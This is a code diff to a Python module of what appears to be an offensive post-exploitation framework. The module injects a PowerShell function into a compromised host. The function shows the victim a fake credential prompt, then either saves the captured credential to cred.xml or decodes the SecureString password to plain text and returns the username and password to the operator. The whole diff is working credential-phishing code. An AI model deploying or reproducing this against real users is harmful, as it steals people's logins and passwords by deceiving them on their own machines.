@@ -22,28 +22,35 @@ class CustomModule(Module):
     # This module must be always implemented, it is called by the run option
     def run_module(self):
         if exist_warrior(self.args["warrior"]):
-            function = """function getcredentials {
+            function = """function getcredentials  {
                     param(
                     [Parameter(Mandatory)]
                     [String] $title,
                     [Parameter(Mandatory)]
                     [String] $message,
                     [Parameter(Mandatory=$false)]
-                    [String] $domain
+                    [String] $domain,
+		    [switch]$persistent
                     )
 
                     if (-not $domain) { $domain = "" }
-                    $credential = $host.ui.PromptForCredential($title, $message, "", $domain)
-                    $path = ($pwd.Path+"\cred.xml")
-                    $credential | Export-Clixml -Path $path
-                    return ("Credentials file: " + $path)
+		    $credential = $host.ui.PromptForCredential($title, $message, "", $domain)
+
+		    if ($persistent.IsPresent) {
+		         $path = ($pwd.Path+"\cred.xml")
+                         $credential | Export-Clixml -Path $path
+                         return ("Credentials file: " + $path)
+                    }
+		    $passConvert = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password);
+		    $noSecurePass = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($passConvert);
+		    return ("User: " + $credential.UserName + " - Password: " + $noSecurePass)
                     # To Import
                     # $credential = Import-Clixml -Path ($pwd.Path+"\cred.xml")
                 }
             """
 
-            if self.args["domain"]:
-                function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "' -domain '" + self.args["domain"] + "'"
+            if self.args["persistent"].lower() == "true":
+                function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "' -persistent"
             else:
                 function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "'"
 
